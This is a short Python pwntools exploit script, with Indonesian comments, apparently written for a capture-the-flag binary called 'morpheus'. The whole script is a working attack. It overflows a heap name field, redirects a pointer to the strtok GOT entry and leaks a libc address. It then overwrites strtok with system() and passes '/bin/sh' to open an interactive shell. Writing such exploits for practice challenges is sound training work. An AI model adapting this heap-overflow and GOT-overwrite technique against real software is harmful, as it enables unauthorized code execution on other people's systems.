from pwn import *
r = process("./morpheus")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def un64(data):
    return int(data[::-1].encode("hex"),16)

def main():
    offset = 40
    strtok = 0x000000602078
    info_chunk  = 0x0000000000000021 # nilai ini tidak boleh di rubah di heap
    p = "A" * offset
    p += p64(info_chunk)
    p += p64(strtok)
    p += p64(0x00)

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","2")
    r.sendlineafter("Insert Name: ",p)

    ## --------------------
    ##  alamat libc diawali dengan 0xf7
    ##
    r.recvuntil("| ID   : 3")
    r.recvuntil("| Name : ")
    leak = un64(r.recv(8).replace("|","").replace("\n",""))
    log.info("leak : " + str(hex(leak)))

    # -----------------------
    # perhitungan untuk mendapatkan alamat system()
    # lan coba strtok ganti jadi puts atau apa gitu , okeoke bang gw coba
    libc_base = leak - libc.symbols['strtok']
    libc_system = libc_base + libc.symbols['system']

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","3")
    r.sendlineafter("Insert Name: ",p64(libc_system))


    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","1")
    r.sendlineafter("Insert Name: ","/bin/sh")
    r.interactive()
# run




if __name__ == '__main__':
    main()
